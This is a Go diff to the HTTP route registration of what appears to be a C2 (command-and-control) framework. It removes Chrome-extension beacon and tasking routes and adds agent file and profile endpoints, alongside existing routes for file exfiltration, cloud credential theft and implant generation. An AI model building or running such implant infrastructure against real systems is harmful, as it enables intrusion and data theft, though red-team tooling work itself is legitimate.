@@ -34,12 +34,6 @@ func (s *Server) registerPublicRoutes() {
 	s.router.GET("/extc2/ws", wsRateLimiter.Limit(), s.handleExternalC2WebSocket)
 	s.router.GET("/ws/operator", wsRateLimiter.Limit(), s.handleOperatorWS)
 
-	// Chrome extension C2: public beacon + packaged extension download.
-	// Auth is the optional derived chrome token (see handleChromeBeacon),
-	// matching the implant beacon's unauthenticated check-in contract.
-	chromeBeaconLimiter := middleware.NewRateLimiter(s.ctx, BeaconRateLimit, BeaconRateWindow)
-	s.router.POST("/api/chrome/beacon", middleware.RequestBodyLimit(MaxJSONBodySize), chromeBeaconLimiter.Limit(), s.handleChromeBeacon)
-	s.router.GET("/forgec2-chrome-c2.zip", chromeBeaconLimiter.Limit(), s.handleChromeExtensionZip)
 }
 
 // registerAgentRoutes registers dashboard and agent CRUD routes.
@@ -208,6 +202,8 @@ func (s *Server) registerAgentCommandRoutes(auth *gin.RouterGroup) {
 		agentCmd.POST("/files/ls", s.handleListDir)
 		agentCmd.POST("/files/delete", s.handleFileDelete)
 		agentCmd.POST("/files/read", s.handleFileRead)
+		agentCmd.POST("/files/mkdir", s.handleFileMkdir)
+		agentCmd.POST("/files/rename", s.handleFileRename)
 		agentCmd.POST("/files/upload", s.handleFileUploadFromAgent)
 		agentCmd.POST("/files/pull", s.handleFileUploadFromAgent)
 		agentCmd.GET("/files/exfil/:filename", s.handleFileExfilGet)
@@ -255,6 +251,8 @@ func (s *Server) registerGenerateRoutes(auth *gin.RouterGroup) {
 	{
 		genWrite.POST("/api/generate/profile", s.handleSaveProfile)
 		genWrite.POST("/api/generate/profile/import", s.handleImportProfile)
+		genWrite.POST("/api/generate/profile/import-text", s.handleImportProfileText)
+		genWrite.POST("/api/generate/profile/validate", s.handleValidateProfile)
 		genWrite.DELETE("/api/generate/profile/:name", s.handleDeleteProfile)
 		genWrite.POST("/generate/exe", s.handleGenerateEXE)
 		genWrite.POST("/generate/dll", s.handleGenerateDLL)
@@ -1073,13 +1071,11 @@ func (s *Server) registerIntegrationRoutes(auth *gin.RouterGroup) {
 	intelRead.Use(middleware.RequirePermission(db.PermIntelRead))
 	{
 		intelRead.GET("/cloud/:agentId/results", s.handleCloudResults)
-		intelRead.GET("/api/chrome/agents", s.handleChromeAgents)
 	}
 	intelWrite := auth.Group("/")
 	intelWrite.Use(middleware.RequirePermission(db.PermIntelWrite))
 	{
 		intelWrite.POST("/cloud/steal", s.handleCloudSteal)
-		intelWrite.POST("/chrome/agents/:uuid/tasks", s.handleChromeAgentTask)
 	}
 
 	integrationRead := auth.Group("/")
